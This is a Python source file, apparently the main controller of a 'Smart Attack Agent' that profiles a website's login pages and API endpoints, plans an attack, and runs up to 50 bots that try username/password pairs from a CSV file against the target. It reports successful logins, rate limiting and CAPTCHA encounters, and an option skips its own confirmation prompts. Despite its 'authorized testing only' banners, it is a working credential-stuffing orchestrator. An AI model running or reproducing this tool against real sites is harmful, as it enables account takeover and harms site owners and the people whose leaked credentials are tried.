"""
Smart Attack Agent - Main Controller

Intelligent, adaptive attack agent that:
1. Profiles target website
2. Plans attack strategy with AI
3. Deploys distributed bots
4. Adapts in real-time
5. Generates comprehensive reports
"""

import argparse
import sys
import asyncio
from pathlib import Path
from datetime import datetime
from colorama import init, Fore, Style
import warnings

# Initialize colorama
init(autoreset=True)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Import our intelligent modules
from url_validator import URLValidator
from website_profiler import WebsiteProfiler
from attack_planner import AttackPlanner
from bot_orchestrator import BotOrchestrator
from credential_tester import CredentialStuffingTester
from report_generator import ReportGenerator
import pandas as pd


class SmartAttackAgent:
    """
    Intelligent, Self-Adapting Attack Agent
    
    Unlike traditional tools, this agent:
    - Understands the target's structure
    - Plans attacks intelligently  
    - Adapts strategy in real-time
    - Coordinates distributed bots
    """
    
    def __init__(self, 
                 target_url: str,
                 credentials_file: str,
                 max_bots: int = 50,
                 max_credentials: int = None,
                 skip_prompts: bool = False):
        """
        Initialize smart attack agent
        
        Args:
            target_url: Target website URL
            credentials_file: Path to credentials CSV
            max_bots: Maximum number of bots (1-50)
            max_credentials: Maximum credentials to test
            skip_prompts: If True, skip intermediate confirmations
        """
        self.target_url = target_url
        self.credentials_file = credentials_file
        self.max_bots = min(max(1, max_bots), 50)  # Clamp between 1-50
        self.max_credentials = max_credentials
        self.skip_prompts = skip_prompts
        
        # Initialize components
        self.validator = URLValidator()
        self.profiler = None
        self.planner = None
        self.orchestrator = None
        self.reporter = ReportGenerator()
        
        # Results storage
        self.validated_url = None
        self.website_profile = {}
        self.attack_strategy = {}
        self.attack_results = []
    
    def run(self):
        """Execute intelligent attack workflow"""
        print(f"\n{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}   🧠 SMART ATTACK AGENT{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}   AI-Powered Distributed Attack Simulation{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}⚠️  AUTHORIZED TESTING ONLY{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}    Never use on systems you don't own!{Style.RESET_ALL}\n")
        
        # Ask for confirmation
        print(f"{Fore.CYAN}Configuration:{Style.RESET_ALL}")
        print(f"  Target: {self.target_url}")
        print(f"  Max Bots: {self.max_bots}")
        print(f"  Credentials: {self.credentials_file}")
        print()
        
        if not self.skip_prompts:
            confirm = input(f"{Fore.YELLOW}Proceed with intelligent attack? (yes/no): {Style.RESET_ALL}").strip().lower()
            if confirm not in ['yes', 'y']:
                print(f"\n{Fore.RED}Attack cancelled by user{Style.RESET_ALL}")
                return False
        else:
             print(f"{Fore.GREEN}Automatically proceeding...{Style.RESET_ALL}")
        
        start_time = datetime.now()
        
        try:
            # Phase 1: Validate URL
            if not self._phase1_validate():
                return False
            
            # Phase 2: Intelligent Profiling
            if not self._phase2_profile():
                return False
            
            # Phase 3: AI-Powered Planning
            if not self._phase3_plan():
                return False
            
            # Phase 4: User Confirmation
            if not self._phase4_confirm():
                return False
            
            # Phase 5: Deploy Distributed Attack
            if not self._phase5_attack():
                return False
            
            # Phase 6: Generate Report
            if not self._phase6_report():
                return False
            
            # Success summary
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            
            print(f"\n{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}✓ INTELLIGENT ATTACK COMPLETE{Style.RESET_ALL}")
            print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
            print(f"\nTotal duration: {duration:.2f} seconds")
            print(f"Reports generated in: ./reports/\n")
            
            return True
            
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Attack interrupted by user{Style.RESET_ALL}")
            return False
        except Exception as e:
            print(f"\n\n{Fore.RED}[✗] Fatal error: {str(e)}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
            return False
    
    def _phase1_validate(self) -> bool:
        """Phase 1: URL Validation"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}PHASE 1: URL VALIDATION{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        is_valid, corrected_url, message = self.validator.validate_and_correct(self.target_url)
        
        if not is_valid:
            print(f"\n{Fore.RED}[✗] URL validation failed: {message}{Style.RESET_ALL}")
            return False
        
        self.validated_url = corrected_url
        print(f"\n{Fore.GREEN}[✓] URL validated: {self.validated_url}{Style.RESET_ALL}")
        return True
    
    def _phase2_profile(self) -> bool:
        """Phase 2: Intelligent Website Profiling"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}PHASE 2: INTELLIGENT PROFILING{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        self.profiler = WebsiteProfiler(self.validated_url)
        
        try:
            # Run async analysis
            self.website_profile = asyncio.run(self.profiler.analyze())
        except Exception as e:
            print(f"{Fore.RED}[✗] Profiling failed: {str(e)}{Style.RESET_ALL}")
            return False
        
        if not self.website_profile.get('login_methods') and not self.website_profile.get('api_endpoints'):
            print(f"\n{Fore.YELLOW}[!] No authentication endpoints discovered{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    The agent couldn't find login pages or API endpoints{Style.RESET_ALL}")
            
            if self.skip_prompts:
                print(f"\n{Fore.YELLOW}Auto-continuing despite missing endpoints...{Style.RESET_ALL}")
            else:
                retry = input(f"\n{Fore.CYAN}Continue anyway? (yes/no): {Style.RESET_ALL}").strip().lower()
                if retry not in ['yes', 'y']:
                    return False
        
        return True
    
    def _phase3_plan(self) -> bool:
        """Phase 3: AI-Powered Attack Planning"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}PHASE 3: AI-POWERED STRATEGY PLANNING{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        self.planner = AttackPlanner(self.website_profile)
        self.attack_strategy = self.planner.plan_attack(max_bots=self.max_bots)
        
        # Print the strategy
        self.planner.print_strategy()
        
        return True
    
    def _phase4_confirm(self) -> bool:
        """Phase 4: User reviews and confirms attack plan"""
        print(f"\n{Fore.YELLOW}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}PHASE 4: ATTACK CONFIRMATION{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'='*70}{Style.RESET_ALL}\n")
        
        bot_count = self.attack_strategy['bot_configuration']['total_bots']
        probability = self.attack_strategy['success_probability']
        
        print(f"{Fore.CYAN}The agent will:{Style.RESET_ALL}")
        print(f"  • Deploy {bot_count} attack bots")
        print(f"  • Target {len(self.attack_strategy['attack_vectors'])} endpoint(s)")
        print(f"  • Estimated success: {probability:.1f}%")
        print()
        
        # Ask for number of credentials to use
        try:
            df = pd.read_csv(self.credentials_file)
            total_creds = len(df)
            
            if self.max_credentials:
                creds_to_use = min(self.max_credentials, total_creds)
            else:
                if self.skip_prompts:
                    creds_to_use = total_creds
                else:
                    print(f"{Fore.CYAN}Available credentials: {total_creds}{Style.RESET_ALL}")
                    creds_input = input(f"{Fore.CYAN}How many to test? (press Enter for all): {Style.RESET_ALL}").strip()
                    
                    if creds_input:
                        creds_to_use = min(int(creds_input), total_creds)
                    else:
                        creds_to_use = total_creds
            
            self.max_credentials = creds_to_use
            print(f"{Fore.GREEN}Will test {creds_to_use} credential pairs{Style.RESET_ALL}\n")
            
        except Exception as e:
            print(f"{Fore.RED}Error loading credentials: {str(e)}{Style.RESET_ALL}")
            return False
        
        if self.skip_prompts:
             return True
             
        confirm = input(f"{Fore.YELLOW}Execute attack plan? (yes/no): {Style.RESET_ALL}").strip().lower()
        return confirm in ['yes', 'y']
    
    def _phase5_attack(self) -> bool:
        """Phase 5: Deploy Distributed Attack"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}PHASE 5: DISTRIBUTED ATTACK EXECUTION{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        # Load credentials
        try:
            df = pd.read_csv(self.credentials_file)
            credentials = df[['username', 'password']].to_dict('records')
            credentials = credentials[:self.max_credentials]
        except Exception as e:
            print(f"{Fore.RED}Error loading credentials: {str(e)}{Style.RESET_ALL}")
            return False
        
        # Create and deploy orchestrator
        self.orchestrator = BotOrchestrator(self.attack_strategy)
        
        # Run async attack
        try:
            asyncio.run(self.orchestrator.deploy_bots(credentials, self.max_credentials))
            self.attack_results = self.orchestrator.get_results()
            return True
        except Exception as e:
            print(f"{Fore.RED}Error during attack: {str(e)}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
            return False
    
    def _phase6_report(self) -> bool:
        """Phase 6: Generate Comprehensive Report"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}PHASE 6: REPORT GENERATION{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        # Compile complete test results
        complete_results = {
            'profile': self.website_profile,
            'strategy': self.attack_strategy,
            'execution': self.orchestrator.get_summary_stats(),
            'detailed_results': self.attack_results
        }
        
        # Generate enhanced report
        test_metadata = {
            'agent_version': '2.0 (Smart Agent)',
            'max_bots': self.max_bots,
            'credentials_tested': self.max_credentials,
            'attack_type': 'intelligent_distributed'
        }
        
        # Convert to legacy format for reporter
        crawl_results = {
            'login_pages': self.website_profile.get('login_methods', []),
            'discovery_log': self.website_profile.get('discovery_log', []),
            'technology_stack': self.website_profile.get('technology_stack', {}),
            'defense_mechanisms': self.website_profile.get('defense_mechanisms', []),
            'robots_txt': {'exists': False}, # Placeholder
            'sitemap_xml': {'exists': False} # Placeholder
        }
        
        test_results = {
            'total_attempts': self.orchestrator.total_requests,
            'successful_logins': [r for r in self.attack_results if r['status'] == 'success'],
            'failed_logins': [r for r in self.attack_results if r['status'] == 'failed'],
            'blocked_attempts': [r for r in self.attack_results if r.get('blocked')],
            'rate_limited': self.orchestrator.blocked_bots > 0,
            'captcha_detected': self.orchestrator.captcha_encounters > 0,
            'errors': [r for r in self.attack_results if r['status'] == 'error']
        }
        
        self.reporter.generate_report(
            self.validated_url,
            crawl_results,
            test_results,
            test_metadata
        )
        
        return True


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='Smart Attack Agent - AI-Powered Security Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
    Examples:
      Basic smart attack:
        python smart_agent.py https://example.com credentials.csv

      Custom bot count:
        python smart_agent.py https://example.com creds.csv --bots 30

      Limited credentials:
        python smart_agent.py https://example.com creds.csv --max-creds 50

    ⚠️  WARNING: Only use on systems you own or have explicit permission to test!
        """
    )
    
    parser.add_argument(
        'target',
        nargs='?',
        help='Target website URL'
    )
    
    parser.add_argument(
        'credentials',
        nargs='?',
        help='Path to credentials CSV file'
    )
    
    parser.add_argument(
        '--bots',
        type=int,
        default=None,
        help='Number of attack bots (1-50)'
    )
    
    parser.add_argument(
        '--max-creds',
        type=int,
        default=None,
        help='Maximum credentials to test'
    )
    
    parser.add_argument(
        '--skip-prompts',
        action='store_true',
        help='Skip interactive confirmations'
    )
    
    args = parser.parse_args()
    
    print(f"\n{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}   🧠 SMART ATTACK AGENT{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}   Interactive Setup{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}\n")

    # 1. Target Website
    if not args.target:
        while True:
            target = input(f"{Fore.YELLOW}Enter target website URL: {Style.RESET_ALL}").strip()
            if target:
                args.target = target
                break
            print(f"{Fore.RED}Target URL is required.{Style.RESET_ALL}")
    
    # 2. Credentials File
    if not args.credentials:
        default_creds = "credentials.csv"
        creds_input = input(f"{Fore.YELLOW}Enter credentials CSV file [{default_creds}]: {Style.RESET_ALL}").strip()
        args.credentials = creds_input if creds_input else default_creds
    
    # Validate credentials file existence early
    if not Path(args.credentials).exists():
        print(f"{Fore.RED}Error: Credentials file not found: {args.credentials}{Style.RESET_ALL}")
        # Offer one retry if interactive
        if not any(v for v in vars(parser.parse_args([])).values() if v is not None): # simplistic check if run without args
             retry = input(f"{Fore.YELLOW}File not found. Try again or press Enter to exit: {Style.RESET_ALL}").strip()
             if retry and Path(retry).exists():
                 args.credentials = retry
             else:
                 sys.exit(1)
        else:
             sys.exit(1)

    # 3. Number of Bots
    if args.bots is None:
        while True:
            try:
                bot_input = input(f"{Fore.YELLOW}Enter number of bots (1-50) [5]: {Style.RESET_ALL}").strip()
                if not bot_input:
                    args.bots = 5
                    break
                num = int(bot_input)
                if 1 <= num <= 50:
                    args.bots = num
                    break
                print(f"{Fore.RED}Please enter between 1 and 50.{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Invalid number.{Style.RESET_ALL}")

    # 4. Max Credentials
    if args.max_creds is None:
        try:
            # Count total for context
            total_lines = sum(1 for _ in open(args.credentials, encoding='utf-8')) - 1 # approx
            creds_input = input(f"{Fore.YELLOW}Enter max credentials to use (Total ~{total_lines}) [All]: {Style.RESET_ALL}").strip()
            if creds_input:
                 args.max_creds = int(creds_input)
            else:
                 args.max_creds = None # Uses all
        except Exception:
            args.max_creds = None

    # Create and run smart agent
    agent = SmartAttackAgent(
        target_url=args.target,
        credentials_file=args.credentials,
        max_bots=args.bots,
        max_credentials=args.max_creds,
        skip_prompts=args.skip_prompts
    )
    
    success = agent.run()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
